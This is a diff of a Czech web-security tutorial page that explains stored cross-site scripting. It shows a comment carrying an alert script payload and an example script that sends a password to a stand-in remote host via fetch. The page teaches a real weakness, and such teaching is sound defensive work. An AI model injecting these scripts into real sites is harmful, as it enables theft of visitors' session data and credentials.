@@ -7,7 +7,28 @@
 		Mám otázku.
 		&lt;script&gt;alert("Hello, World!");&lt;/script&gt;
 	</span><br>
-	Tento příspěvěk zveřejní a po načtení stránky se jeho příspěvek na stránce objeví<br>
+	Tento příspěvěk zveřejní a po načtení stránky se jeho příspěvek na stránce objeví.<br>
 	<br>
-	TODO!
+	Uživatelé ale na stránce uvidí pouze text "Mám otázku." a JavaScript kód už ne.<br>
+	Bude vidět, když si zobrazíte zdrojový kód stránky, což běžný uživatel nedělá.<br>
+	<br>
+	<span class="red bold font-size-bigger">Teď nastává problém!</span><br>
+	Kdykoliv někdo stránku navštíví, tak se tento komentář načte, a s ním i tento skript, který se okamžitě i spustí.<br>
+	V tomto případě by se pouze zobrazilo okno s nápisem "Hello, World!", ale skutečný útočník by mohl například posílat data z vaší relace na svoji vzálenou adresu.<br>
+	<br>
+	Tento problém spočívá v tom, že aplikace ukládá komentář v prostém textu a ten potom vkládá do HTML dokumentu.<br>
+	To ovšem znamená, že jakýkoliv HTML kód bude prohlížečem považován za legitimní a bude tak taky zobrazen.<br>
+	Toto v případě vstupu od uživatele nechceme.<br>
+	<br>
+	Pomocí JavaScriptu lze například odesílat data na jiné adresy pomocí funkcí <a href="https://javascript.info/xmlhttprequest">XMLHttpRequest</a> nebo <a href="https://javascript.info/fetch">fetch</a><br>
+	<span class="code multi-line-code nosplit">
+		&lt;script&gt;<br>
+		&emsp;&emsp;&emsp;&emsp;fetch("http://send/secrets/here?password=ABCabc123");<br>
+		&lt;/script&gt;<br>
+	</span>
+	<br>
+	Krom toho se dá také modifikovat samotné HTML:<br>
+	<pre class="code multi-line-code nosplit">
+		
+	</pre>
 </div>
